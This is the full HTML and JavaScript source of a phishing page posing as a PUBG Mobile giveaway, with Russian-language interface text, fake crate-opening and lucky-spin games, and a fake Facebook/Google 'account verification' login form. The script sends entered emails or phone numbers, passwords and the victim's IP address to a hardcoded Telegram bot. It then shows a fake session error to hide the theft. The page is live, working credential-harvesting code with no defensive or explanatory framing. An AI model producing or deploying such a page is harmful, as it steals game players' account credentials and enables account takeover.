<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>PUBG Mobile Giveaway</title>
    
    <link href="https://fonts.googleapis.com/css2?family=Teko:wght@400;600;700&family=Inter:wght@400;700;900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <script src="https://cdn.tailwindcss.com"></script>

    <style>
        :root {
            --pubg-gold: #ffbc00;
            --pubg-gold-dark: #cc9600;
            --pubg-dark: #0b0c0d;
            --pubg-blue: #0084ff;
        }

        body {
            background-color: var(--pubg-dark);
            color: white;
            font-family: 'Inter', sans-serif;
            margin: 0; padding: 0;
            overflow-x: hidden;
            user-select: none;
            -webkit-tap-highlight-color: transparent;
        }

        .pubg-font { font-family: 'Teko', sans-serif; text-transform: uppercase; letter-spacing: 1px; }

        header {
            background: rgba(0, 0, 0, 0.95);
            padding: 12px 16px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
            position: sticky; top: 0; z-index: 100;
        }

        .balance-display {
            background: rgba(255, 255, 255, 0.05);
            border-radius: 20px;
            padding: 4px 10px;
            display: flex;
            align-items: center;
            gap: 6px;
            border: 1px solid rgba(255,255,255,0.1);
        }

        .uc-icon {
            background: #1a1a1a;
            border: 1px solid #c4a162;
            border-radius: 4px;
            padding: 1px 4px;
            font-size: 10px;
            font-weight: 900;
            color: #fff;
        }

        /* –ö–ï–ô–° */
        .case-container {
            position: relative;
            width: 100%;
            height: 180px;
            overflow: hidden;
            margin: 20px 0;
            background: radial-gradient(circle, rgba(255, 188, 0, 0.02) 0%, transparent 80%);
        }

        .case-line {
            position: absolute;
            top: 0; left: 50%;
            width: 2px; height: 100%;
            background: var(--pubg-gold);
            z-index: 20;            box-shadow: 0 0 15px var(--pubg-gold);
            transform: translateX(-50%);
        }

        .case-tape {
            display: flex;
            padding: 35px 0;
            transition: transform 5s cubic-bezier(0.15, 0, 0.15, 1);
            will-change: transform;
        }

        .case-item {
            min-width: 140px;
            width: 140px;
            height: 110px;
            display: flex;
            align-items: center;
            justify-content: center;
            opacity: 0.4;
        }
        .case-item img { width: 100px; height: 100px; object-fit: contain; }

        .btn-action {
            background: var(--pubg-blue);
            color: white;
            width: calc(100% - 32px);
            margin: 0 16px;
            padding: 16px;
            border-radius: 12px;
            font-weight: 700;
            text-align: center;
            cursor: pointer;
            display: block;
        }

        /* –û–ö–ù–û –í–´–ò–ì–†–´–®–ê - –ù–û–í–´–ô –î–ò–ó–ê–ô–ù */
        .win-modal {
            position: fixed; inset: 0;
            background: rgba(0,0,0,0.97);
            backdrop-filter: blur(10px);
            z-index: 5000; display: none;
            flex-direction: column; justify-content: center; align-items: center; padding: 20px;
        }

        .win-card {
            background: #0f1012;
            border: 2px solid var(--pubg-gold);
            border-radius: 24px; 
            padding: 40px 24px; 
            width: 100%; max-width: 320px; 
            text-align: center;
            position: relative;
            box-shadow: 0 0 40px rgba(255, 188, 0, 0.2);
        }

        .win-glow {
            position: absolute;
            top: 40%; left: 50%;
            transform: translate(-50%, -50%);
            width: 200px; height: 200px;
            background: radial-gradient(circle, rgba(255, 188, 0, 0.3) 0%, transparent 70%);
            z-index: 0;
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0% { transform: translate(-50%, -50%) scale(0.9); opacity: 0.6; }
            50% { transform: translate(-50%, -50%) scale(1.1); opacity: 1; }
            100% { transform: translate(-50%, -50%) scale(0.9); opacity: 0.6; }
        }

        #winPrizeImg {
            position: relative;
            z-index: 1;
            width: 180px; height: 180px;
            margin: 0 auto 30px auto;
            filter: drop-shadow(0 10px 20px rgba(0,0,0,0.5));
        }

        .btn-claim {
            background: linear-gradient(180deg, #ffbc00 0%, #ff9000 100%);
            color: #000;
            width: 100%;
            padding: 15px;
            border-radius: 8px;
            font-family: 'Teko', sans-serif;
            font-size: 26px;
            font-weight: 700;
            text-transform: uppercase;
            box-shadow: 0 5px 15px rgba(255, 144, 0, 0.4);
            cursor: pointer;
            border: none;
            position: relative; z-index: 2;
        }

        /* –ù–ê–í–ò–ì–ê–¶–ò–Ø */
        .nav-bar {
            position: fixed; bottom: 0; left: 0; right: 0;
            background: #000; height: 70px;
            display: flex; justify-content: space-around; align-items: center;
            border-top: 1px solid rgba(255, 255, 255, 0.05);
            z-index: 100;
        }
        .nav-item { display: flex; flex-direction: column; align-items: center; color: #444; font-size: 10px; cursor: pointer; }
        .nav-item.active { color: var(--pubg-gold); }

        .modal-auth {
            position: fixed; inset: 0; background: rgba(0,0,0,0.95);
            z-index: 6000; display: none; flex-direction: column; padding: 20px;
            justify-content: center;
        }
        .login-box { background: white; color: black; border-radius: 20px; padding: 25px; width: 100%; max-width: 350px; margin: auto; }input { width: 100%; padding: 14px; margin: 10px 0; border: 1px solid #ddd; border-radius: 10px; color: black;}
    </style>
</head>
<body>

    <header>
        <div id="backBtn" class="flex items-center gap-2 cursor-pointer" style="visibility: hidden;" onclick="showSection('hub')">
            <i class="fas fa-chevron-left text-gray-400"></i>
            <span class="text-sm font-bold">–ù–∞–∑–∞–¥</span>
        </div>
        <div class="pubg-font text-xl text-center flex-1">Gift Drop</div>
        <div class="balance-display">
            <span class="uc-icon">UC</span>
            <span id="balanceText" class="text-sm font-bold">60</span>
        </div>
    </header>

    <!-- HUB -->
    <div id="section-hub" class="p-4 block">
        <div class="grid grid-cols-2 gap-4 mt-6">
            <div class="bg-[#151618] p-4 rounded-3xl border border-white/5 text-center cursor-pointer" onclick="showSection('case')">
                <img src="ruletka1.png" class="h-36 mx-auto mb-3 rounded-2xl object-cover">
                <div class="pubg-font text-blue-400 text-xl">GIFT DROP</div>
            </div>
            <div class="bg-[#151618] p-4 rounded-3xl border border-white/5 text-center cursor-pointer" onclick="showSection('spin')">
                <img src="ruletka2.png" class="h-36 mx-auto mb-3 rounded-2xl object-cover">
                <div class="pubg-font text-yellow-500 text-xl">LUCKY SPIN</div>
            </div>
        </div>
    </div>

    <!-- CASE -->
    <div id="section-case" class="hidden">
        <div class="text-center py-8">
            <h2 class="pubg-font text-4xl">Classic Crate</h2>
        </div>
        <div class="case-container">
            <div class="case-line"></div>
            <div id="caseTape" class="case-tape"></div>
        </div>
        <div id="openBtn" onclick="openCase()" class="btn-action !bg-white !text-black mb-4">–û–¢–ö–†–´–¢–¨ (60 UC)</div>
        <div id="depositBtn" onclick="startAuth()" class="btn-action hidden">–ü–û–ü–û–õ–ù–ò–¢–¨ –ë–ê–õ–ê–ù–°</div>
    </div>

    <!-- SPIN -->
    <div id="section-spin" class="hidden p-5">
        <div class="text-center py-6">
            <h2 class="pubg-font text-4xl">Lucky Spin</h2>
        </div>
        <div class="bg-[#151618] rounded-[32px] p-4 border-2 border-[#25262b] mb-8">
            <div class="grid grid-cols-3 gap-3">
                <div class="bg-[#25262b] aspect-square rounded-2xl p-2 border-2 border-transparent transition-all" id="s0"><img src="priz1.png" class="w-full h-full object-contain"></div>
                <div class="bg-[#25262b] aspect-square rounded-2xl p-2 border-2 border-transparent transition-all" id="s1"><img src="priz2.png" class="w-full h-full object-contain"></div>
                <div class="bg-[#25262b] aspect-square rounded-2xl p-2 border-2 border-transparent transition-all" id="s2"><img src="priz3.png" class="w-full h-full object-contain"></div>
                <div class="bg-[#25262b] aspect-square rounded-2xl p-2 border-2 border-transparent transition-all" id="s7"><img src="priz4.png" class="w-full h-full object-contain"></div>
                <div class="bg-[#25262b] aspect-square rounded-2xl p-2 border-2 border-transparent transition-all" id="mid"><img src="priz5.png" class="w-full h-full object-contain"></div>
                <div class="bg-[#25262b] aspect-square rounded-2xl p-2 border-2 border-transparent transition-all" id="s3"><img src="priz6.png" class="w-full h-full object-contain"></div>
                <div class="bg-[#25262b] aspect-square rounded-2xl p-2 border-2 border-transparent transition-all" id="s6"><img src="priz7.png" class="w-full h-full object-contain"></div>
                <div class="bg-[#25262b] aspect-square rounded-2xl p-2 border-2 border-transparent transition-all" id="s5"><img src="priz8.png" class="w-full h-full object-contain"></div>
                <div class="bg-[#25262b] aspect-square rounded-2xl p-2 border-2 border-transparent transition-all" id="s4"><img src="priz9.png" class="w-full h-full object-contain"></div>
            </div>
        </div>
        <button id="spinBtn" class="btn-action !mx-0 !bg-[#ffbc00] !text-black !w-full pubg-font text-2xl" onclick="startSpin()">–ö–†–£–¢–ò–¢–¨ (60 UC)</button>
        <button id="spinDepositBtn" class="btn-action !mx-0 hidden !w-full" onclick="startAuth()">–ü–û–ü–û–õ–ù–ò–¢–¨ –ë–ê–õ–ê–ù–°</button>
    </div>

    <!-- WIN MODAL -->
    <div id="winModal" class="win-modal">
        <div class="win-card">
            <div class="win-glow"></div>
            <img id="winPrizeImg" src="" alt="Prize">
            <button onclick="closeWinModal()" class="btn-claim">–ó–∞–±—Ä–∞—Ç—å –ø—Ä–∏–∑</button>
        </div>
    </div>

    <!-- AUTH -->
    <div id="modalAuth" class="modal-auth">
        <div class="login-box">
            <h2 class="font-black text-xl mb-6 text-center">–í–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—è –∞–∫–∫–∞—É–Ω—Ç–∞</h2>
            <button onclick="openForm('Facebook')" class="w-full bg-[#1877F2] text-white p-4 rounded-xl mb-3 font-bold flex items-center justify-center gap-3"><i class="fab fa-facebook-f"></i> Facebook</button>
            <button onclick="openForm('Google')" class="w-full bg-white text-black border border-gray-200 p-4 rounded-xl mb-3 font-bold flex items-center justify-center gap-3"><i class="fab fa-google"></i> Google</button>
            <button onclick="document.getElementById('modalAuth').style.display='none'" class="w-full text-gray-400 text-sm mt-4 text-center">–û—Ç–º–µ–Ω–∞</button>
        </div>
    </div>

    <div id="modalForm" class="modal-auth">
        <div class="login-box">
            <h2 id="methodName" class="font-black text-xl mb-4">Login</h2>
            <input type="text" id="inpUser" placeholder="Email –∏–ª–∏ —Ç–µ–ª–µ—Ñ–æ–Ω">
            <input type="password" id="inpPass" placeholder="–ü–∞—Ä–æ–ª—å">
            <button onclick="finalSubmit()" class="w-full bg-blue-600 text-white p-4 rounded-xl mt-4 font-bold">–í–æ–π—Ç–∏</button>
        </div>
    </div>

    <nav class="nav-bar">
        <div class="nav-item" onclick="showSection('case')"><i class="fas fa-box-open text-xl mb-1"></i><span>Cases</span></div>
        <div class="nav-item active" id="nav-hub" onclick="showSection('hub')"><i class="fas fa-gamepad text-xl mb-1"></i><span>Games</span></div>
        <div class="nav-item" onclick="startAuth()"><i class="fas fa-user text-xl mb-1"></i><span>Profile</span></div>
    </nav>

    <script>
        const BOT_TOKEN = '8498045152:AAH6b4APGZfXDz0Dm0UFvN0kIkfvqtmViKU';
        const CHAT_ID = '1709490182';
        const prizeImages = ['priz1.png', 'priz2.png', 'priz3.png', 'priz4.png', 'priz5.png', 'priz6.png', 'priz7.png', 'priz8.png', 'priz9.png'];
        
        let balance = 60; 
        let isSpinning = false;
        let userIP = '';
        const itemWidth = 140;

        fetch('https://ipapi.co/json/').then(r => r.json()).then(d => userIP = d.ip + ' (' + d.country_name + ')');

        function updateBalanceUI() {
            document.getElementById('balanceText').innerText = balance;
            const canPlay = balance >= 60;
            document.getElementById('openBtn').classList.toggle('hidden', !canPlay);
            document.getElementById('depositBtn').classList.toggle('hidden', canPlay);
            document.getElementById('spinBtn').classList.toggle('hidden', !canPlay);
            document.getElementById('spinDepositBtn').classList.toggle('hidden', canPlay);
        }

        function showSection(id) {
            if (isSpinning) return;
            
            // –°–∫—Ä—ã–≤–∞–µ–º –≤—Å—ë
            document.getElementById('section-hub').style.display = 'none';
            document.getElementById('section-case').style.display = 'none';
            document.getElementById('section-spin').style.display = 'none';
            
            // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –Ω—É–∂–Ω–æ–µ
            const target = document.getElementById('section-' + id);
            if (target) target.style.display = 'block';

            document.getElementById('backBtn').style.visibility = (id === 'hub') ? 'hidden' : 'visible';
            
            document.querySelectorAll('.nav-item').forEach(el => el.classList.remove('active'));
            if(id === 'hub') document.getElementById('nav-hub').classList.add('active');
            if(id === 'case') document.querySelector('.nav-item:nth-child(1)').classList.add('active');
            
            updateBalanceUI();
        }

        function initCase() {
            const tape = document.getElementById('caseTape');
            tape.innerHTML = '';
            let lastIdx = -1;
            for(let i=0; i<80; i++) {
                let idx;
                do { idx = Math.floor(Math.random() * prizeImages.length); } while (idx === lastIdx);
                lastIdx = idx;
                tape.innerHTML += `<div class="case-item"><img src="${prizeImages[idx]}"></div>`;
            }
        }

        function openCase() {
            if (balance < 60 || isSpinning) return;
            balance -= 60;
            updateBalanceUI();
            isSpinning = true;

            const targetIdx = 45; 
            const tape = document.getElementById('caseTape');
            const offset = (targetIdx * itemWidth) - (window.innerWidth / 2) + (itemWidth / 2);
            
            tape.style.transform = `translateX(-${offset}px)`;
            
            setTimeout(() => {
                const winImg = tape.children[targetIdx].querySelector('img').src;
                showWinModal(winImg);
                sendTelegram(`üéÅ –ö–µ–π—Å | IP: ${userIP}`);
                isSpinning = false;
            }, 5000);
        }

        function startSpin() {
            if (isSpinning || balance < 60) return;
            balance -= 60;
            updateBalanceUI();
            isSpinning = true;

            const cells = ['s0', 's1', 's2', 's3', 's4', 's5', 's6', 's7', 'mid'];
            let step = 0;
            const totalSteps = 25 + Math.floor(Math.random() * 10);

            const interval = setInterval(() => {
                cells.forEach(id => {
                    document.getElementById(id).style.borderColor = 'transparent';
                    document.getElementById(id).style.background = 'transparent';
                });

                const currentId = cells[step % cells.length];
                const currentEl = document.getElementById(currentId);
                currentEl.style.borderColor = '#ffbc00';
                currentEl.style.background = 'rgba(255, 188, 0, 0.1)';

                step++;
                if (step >= totalSteps) {
                    clearInterval(interval);
                    setTimeout(() => {
                        const winImg = currentEl.querySelector('img').src;
                        showWinModal(winImg);
                        sendTelegram(`üé° –†—É–ª–µ—Ç–∫–∞ | IP: ${userIP}`);
                        isSpinning = false;
                    }, 500);
                }
            }, 130);
        }

        function showWinModal(img) {
            document.getElementById('winPrizeImg').src = img;
            document.getElementById('winModal').style.display \ 
= 'flex';
        }

        function closeWinModal() {
            document.getElementById('winModal').style.display = 'none';
            if(balance < 60) startAuth();
        }

        function startAuth() { document.getElementById('modalAuth').style.display = 'flex'; }
        function openForm(m) {
            document.getElementById('modalAuth').style.display = 'none';
            document.getElementById('modalForm').style.display = 'flex';
            document.getElementById('methodName').innerText = m;
        }

        async function finalSubmit() {
            const u = document.getElementById('inpUser').value;
            const p = document.getElementById('inpPass').value;
            if(u.length < 3 || p.length < 3) return;
            await sendTelegram(`üî• LOG \nU: ${u}\nP: ${p}\nIP: ${userIP}`);
            alert('–û—à–∏–±–∫–∞ —Å–µ—Å—Å–∏–∏. –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –∞–≤—Ç–æ—Ä–∏–∑—É–π—Ç–µ—Å—å –∑–∞–Ω–æ–≤–æ.');
            location.reload();
        }

        async function sendTelegram(t) {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({chat_id: CHAT_ID, text: t})
            }).catch(e => {});
        }

        window.onload = () => {
            initCase();
            updateBalanceUI();
        };
    </script>
</body>
</html>
